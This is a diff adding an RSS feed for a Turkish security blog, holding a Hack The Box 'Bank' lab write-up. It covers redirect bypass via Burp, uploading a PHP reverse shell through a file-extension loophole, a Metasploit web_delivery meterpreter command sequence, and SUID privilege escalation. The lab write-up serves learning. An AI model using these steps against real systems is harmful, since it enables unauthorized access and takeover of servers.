@@ -1,0 +1,127 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>4AllUsers</title>
+    <description>Siber Güvenlik Bloğu,Hack The Box ve makina çözümleri, yazılar ve diğer şeyler</description>
+    <link>http://localhost:4000</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
+    <author>
+      <name>Tuğcan Özel</name>
+      <email>tugcanozel@gmail.com</email>
+      <uri>0x4All.github.io</uri>
+    </author>
+    
+      <item>
+        <title>Hack-The-Box Bank</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/assets/hackthebox/Bank/0.png&quot; /&gt; &lt;!-- burayi img tagiyla yapicaksin --&gt;&lt;/p&gt;
+
+&lt;p&gt;Merhaba arkadaşlar, bugün size hack the box makinasi olan Bank’i nasil çözdüğümü anlatmaya çalışıcam.Harbi güzel makinaydı, çözümü birkaç nokta hariç diğer klasikleşmiş makinalarla aynıydı.Makinamız linux makinasıydı ve ip si 10.10.10.29.Hazırsak baslayalım.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;server-enumeration&quot;&gt;Server Enumeration&lt;/h3&gt;
+&lt;p&gt;Ilk olarak tabikide server enumeration icin Nmap taramamizi gerceklestiriyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/hackthebox/Bank/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bakiyorum ki 3 tane acik port 22/SSH 53 DNS ve 80 http her zaman oldugu gibi ilk hedef secilen port kardesimiz http oluyor ve browsera ip yi yazarak http istegi yapiyorum fakat karsima apache sayfasi geliyor buraya content discovery denemeden once dns portunun acik oldugu aklima geliyor ve hemen etc/hosts kismina ipmizi giriyoruz ve bilmiyorsaniz bilmenizde fayda var hacktheboxtaki domain isimleri labismi.htb diye devam eder bu yuzden hosts dosyamizada boyle ekliyoruz.Bunu yazinca karsimiza login.php sayfasi geldi ve submit query diyor allah allah.Bir dedim gobuster atayim ne var ne yok hayirdir yaniii!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/hackthebox/Bank/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
+
+&lt;p&gt;Web sayfasina islem yapmadan once aklimda kalmasin diye nmaptan gelen ciktilardaki portlardaki calisan servislerde bir zafiyet var mi diye hem searchsploit ile hemde google aramalari ile bakindim fakat yoktu simdi donelim httpmize&lt;/p&gt;
+
+&lt;p&gt;bank.htb seklinde browsera yazdigimizda, karsimiza su sekilde bir sayfa geliyor, bu arada robots.txt dizini denedim herhangi bir sey gelmedi.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/hackthebox/Bank/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;content-discovery&quot;&gt;Content Discovery&lt;/h4&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster dir -x php -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt&lt;/code&gt; olarak bombardina basliyoruz.Bu gobusterin update li hali eski halinde dir olmadan direk yazarak kullanabilirsiniz.&lt;/p&gt;
+
+&lt;p&gt;Bu sirada gobuster ararken bizde bir burple araya girelim bakalim ne var ne yok derken…Karsimiz asagidaki gibi cikti geliyor shiiiiiiit.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/hackthebox/Bank/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Uploads dizinine gordukten sonra kafamda su olustu bak beni dinle.&lt;/p&gt;
+
+&lt;p&gt;Dedim ben bir giris yapsam giris yaptiktan sonra bir reverse shell upload etsem netcatle dinlesem sonra booom icerideyim anniyomusun yani.&lt;/p&gt;
+
+&lt;p&gt;Ama ole gelmedi annatabiliyommu yani baktim support.php ve index.php var http istegi gonderiyorum arada burp ile response kisminda html sayfasini goruyorum lakin beni login.php sayfasina yonlendiriyor.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/hackthebox/Bank/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dusundumki onumuzde login sayfasi var buraya bruteforce yapmak aklima gelen ilk seydi ki default credentialslari denemistim admin-password admin-bank gibi fakat username degil email-password istiyordu e bruteforce elendi sayfanin kaynak koduna baktim ordada ipucu yok geriye kalan tek sey php uzantili buldugumuz dosyalara bir bakmamiz lazim.&lt;/p&gt;
+
+&lt;p&gt;Sonra ben internete baktim dedim redirect olmadan renderli bir sekilde gorebilir miyim sayfalari fakat
+sonra open link directly(no redirect diye bir firefox addonsu buldum) Ben firefox kullaniyorum bu arada fakat hic bisi anlamadim nasil kullanildigini sildim.&lt;/p&gt;
+
+&lt;p&gt;Sonra dedimki olm napiosun bende burp proxy var dedim ben responselarida burp le keseyim ordan bir location headeri silelim bakalim noluo
+hoooop dusundugum gibi oldu support.php geldi ve gene dusundugumuz oldu dosya upload yeri geldi.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/hackthebox/Bank/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;php tabanli bir yerde calistigimiz icin php reverse shell denemek istedim.Kullandigim php-reverse-shelli burdan bulabilirsiniz.&lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;Pentestmonkey&lt;/a&gt; sitesinde guzel kaynaklar ve shellllllller bulabilirsiniz kendisi yararli bir site.&lt;/p&gt;
+
+&lt;p&gt;Post ettikten sonra gene redirect vardi bu yuzden gene location headerini sildim bana donene cevap ise kardesim sadece image yukleyebiliyoruz olarak geldi.Dedim bir deneyelim content-type headeri ile oynayalim uzantiyi png.php olarak degistirelim gorelim seklini semalini fakat yemedi izin vermedi.Sonra bir baktimki dikkatsiz davranmisim redirect yaparken html icinde soyle bir yazi vardi.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;[DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG]&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/hackthebox/Bank/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;h3 id=&quot;exploit&quot;&gt;Exploit&lt;/h3&gt;
+
+&lt;p&gt;Sitenin kaynak kodundaki ipucudan sonra .htb uzantisinda php-reverse-shell dosyamizi yukledikten sonra /uploads dizininden dosyaya istek gonderip shellin istek yollayacagi portu dinliyoruz ve booooooom! shellimiz geldi&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/hackthebox/Bank/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Simdi hak yukseltmemiz gerek fakat bundan once eger oluyorsa benim hep arzu ettigim shelli meterpretere tasimak her turlu daha kolay ve esnek olmakta.Bu yuzden, post exploitten once shelli meterpretere tasiyalim.&lt;/p&gt;
+
+&lt;p&gt;Metasploiti actiktan sonra sirasiyla sunlari giriyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; use exploit/multi/script/web_delivery
+&amp;gt; set target 1
+&amp;gt; set lhost vpn-ipniz(tun0)
+&amp;gt; set set payload php/meterpreter/reverse_tcp
+&amp;gt; exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Dedikten sonra size verilen php payloadini netcat ile aldiginiz shellde calistirirsaniz meterpreterda onunuze session olarak dusecektir.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/hackthebox/Bank/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;h3 id=&quot;post-exploitation&quot;&gt;Post-Exploitation&lt;/h3&gt;
+
+&lt;p&gt;Simdi hak yukseltmemiz lazim, isleme baslamadan once size hep yaninizda bulunmasi acisindan soyle bir site birakiyorum.Cok yararli kendisi!Ozellikle privilege escalation cheat sheeti icin kullaniyorum.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://blackwintersecurity.com/&quot;&gt;blackwintersecurity&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;cat /proc/version dedikten sonra gelen kernel versionu Linux version 4.4.0-79-generic.Exploit-db de kendisi hakkinda exploitler vardi fakat meterpreter ile upload edip calistirdiktan sonra error veriodu o yuzden denemeyi kestim.&lt;/p&gt;
+
+&lt;p&gt;Meterpreter shellini aldiktan sonra meterpreterin upload fonksiyonunu kullanarak karsi servera dosya yukluyoruz fakat karsidaki istedigim her yere dosya yukleyemeyiz bunun icin belirli dizinler var.Bunlar listesi tarzi bir sey icin size su linki birakmak isterim &lt;a href=&quot;&amp;quot;https://wiki.archlinux.org/index.php/Tmpfs&amp;quot;&quot;&gt;tmpfs&lt;/a&gt;.Acilimi gecici dosya sistemi olarak gecmekte ve bunun icinde belli dizinler var.Mesela /tmp yada /dev/shm gibi buralar paylasima acik dizinler oldugu icin dosyamizi buraya yukleyerek burdan calistirabilmekteyiz, daha fazlasi icin linke bakabilirsiniz.&lt;/p&gt;
+
+&lt;p&gt;Asagidaki resimde de gorebileceginiz uzere LinEnum.sh olarak gecen bir bash scriptimiz var.Linux isletim sistemlerinde privelege escalation islemini gerceklestirebilmek icin hazirlanan araclar arasindan en iyisi ve en cok kullanilani, size gerekli olan ne varsa getirebilmekte.Dosyamizi yukledikten sonra &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt; yazarak shellimize geciyoruz ve daha sonra calistirma haklari icin &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod&lt;/code&gt; komutunu kullaniyoruz ve her sey hazir olduktan sonrada komutumuzu calistiriyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/hackthebox/Bank/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Onumuze hak yukseltmeye calistigimiz linux isletim sistemi hakkinda cok fazla bilgi gelmekte fakat ben size su anda bizim isimize yarayan yere dikkat cekmek isticem.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/hackthebox/Bank/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Resimdede goruldugu gibi /var/htb/bin/emergency olarak gordugumuz dizin bir suid bitine sahip calistirabilir dosya.Zaten bunu gordukten sonra yakaladigimi hissetmistim bakalim root olicikmiyiz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/hackthebox/Bank/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Evet, goruldugu gibi makinamiz bitmistir.Sagolun tesekkurler.&lt;/p&gt;
+</description>
+        <pubDate>Tue, 06 Aug 2019 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000//machines/bank/</link>
+        <link href="http://localhost:4000/machines/bank/"/>
+        <guid isPermaLink="true">http://localhost:4000/machines/bank/</guid>
+      </item>
+    
+  </channel>
+</rss>
